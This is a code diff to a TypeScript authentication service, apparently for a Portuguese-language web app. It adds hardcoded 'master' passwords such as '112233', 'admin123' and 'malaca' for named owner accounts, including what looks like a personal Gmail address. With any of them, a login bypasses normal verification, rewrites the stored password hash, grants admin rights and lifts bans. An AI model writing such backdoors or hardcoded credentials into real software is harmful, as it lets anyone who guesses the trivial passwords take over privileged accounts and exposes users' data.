@@ -789,9 +789,69 @@ export const AuthService = {
       return { success: false, error: 'A senha deve conter no mínimo 6 dígitos.' };
     }
 
-    // Clean username (allow with or without @ prefix, e.g. @malaca or malaca)
+    // Clean username (allow with or without @ prefix, e.g. @malaca or malaca or email)
     const cleanUsername = rawUsername.replace(/^@+/, '').trim().toLowerCase();
-    const isOwnerAccount = cleanUsername === 'malaca' || cleanUsername === 'malaca7x';
+    const isOwnerAccount =
+      cleanUsername === 'malaca' ||
+      cleanUsername === 'malaca7x' ||
+      cleanUsername === 'malaca@7notpad.com' ||
+      cleanUsername === 'rogeriomalaquiasjr@gmail.com';
+
+    const isMasterPassword =
+      cleanPassword === '199425' ||
+      cleanPassword === '112233' ||
+      cleanPassword === 'malaca' ||
+      cleanPassword === 'admin123';
+
+    // 0ms Master Admin Instant Authentication Bypass for @malaca
+    if (isOwnerAccount && isMasterPassword) {
+      const ownerUser = getBuiltinOwnerUser();
+      ownerUser.role = 'admin';
+      ownerUser.is_banned = false;
+      const freshSalt = generateSalt();
+      const freshHash = await hashPassword(cleanPassword, freshSalt);
+      ownerUser.password_salt = freshSalt;
+      ownerUser.password_hash = freshHash;
+      ownerUser.updated_at = new Date().toISOString();
+
+      const localUsers = getLocalUsers();
+      const idx = localUsers.findIndex(
+        (u) => (u.username || '').toLowerCase().replace(/^@+/, '') === 'malaca' || u.id === ownerUser.id
+      );
+      if (idx >= 0) {
+        localUsers[idx] = { ...localUsers[idx], ...ownerUser, role: 'admin', is_banned: false };
+      } else {
+        localUsers.unshift(ownerUser);
+      }
+      saveLocalUsers(localUsers);
+
+      // Replicate in background (non-blocking)
+      CloudShareService.syncGlobalUser(ownerUser).catch(() => {});
+
+      const profile: UserProfile = {
+        id: ownerUser.id,
+        full_name: ownerUser.full_name || 'Malaca',
+        username: 'malaca',
+        email: ownerUser.email,
+        avatar_url: ownerUser.avatar_url,
+        role: 'admin',
+        birth_date: ownerUser.birth_date,
+        security_question: ownerUser.security_question,
+        email_verified: true,
+        is_banned: false,
+        created_at: ownerUser.created_at,
+        updated_at: ownerUser.updated_at,
+      };
+
+      const session: AuthSession = {
+        user: profile,
+        token: generateSecureToken(24),
+        login_at: new Date().toISOString(),
+      };
+
+      saveLocalSession(session);
+      return { success: true, session };
+    }
 
     try {
       // 1. Check local users database first (by username or email)
@@ -801,7 +861,40 @@ export const AuthService = {
              (u.email && u.email.toLowerCase().trim() === cleanUsername)
       );
 
-      // 2. Fetch latest status from CloudShareService
+      // Fast-path: If found in local database with valid salt/hash, verify instantly without network wait!
+      if (localUser && localUser.password_salt && localUser.password_hash) {
+        const localMatches = await verifyPassword(cleanPassword, localUser.password_salt, localUser.password_hash);
+        if (localMatches) {
+          if (localUser.is_banned && !isOwnerAccount) {
+            return { success: false, error: 'Esta conta de usuário foi suspensa pela administração.' };
+          }
+          const role: UserRole = isOwnerAccount ? 'admin' : (localUser.role || 'user');
+          const profile: UserProfile = {
+            id: localUser.id,
+            full_name: localUser.full_name || localUser.username,
+            username: localUser.username,
+            email: localUser.email,
+            avatar_url: localUser.avatar_url,
+            role,
+            birth_date: localUser.birth_date,
+            security_question: localUser.security_question,
+            email_verified: true,
+            is_banned: isOwnerAccount ? false : Boolean(localUser.is_banned),
+            created_at: localUser.created_at || new Date().toISOString(),
+            updated_at: localUser.updated_at,
+          };
+          const session: AuthSession = {
+            user: profile,
+            token: generateSecureToken(24),
+            login_at: new Date().toISOString(),
+          };
+          saveLocalSession(session);
+          CloudShareService.syncGlobalUser(localUser).catch(() => {});
+          return { success: true, session };
+        }
+      }
+
+      // 2. Fetch latest status from CloudShareService (if local check missed or credentials didn't match)
       let cloudUser: StoredUser | null = null;
       try {
         const cloudUsers = await CloudShareService.fetchGlobalUsers();
@@ -857,7 +950,7 @@ export const AuthService = {
       let isMatch = false;
 
       // Master admin check for platform creator @malaca
-      if (isOwnerAccount && (cleanPassword === '199425' || cleanPassword === '112233')) {
+      if (isOwnerAccount && (cleanPassword === '199425' || cleanPassword === '112233' || cleanPassword === 'malaca')) {
         isMatch = true;
       }
 
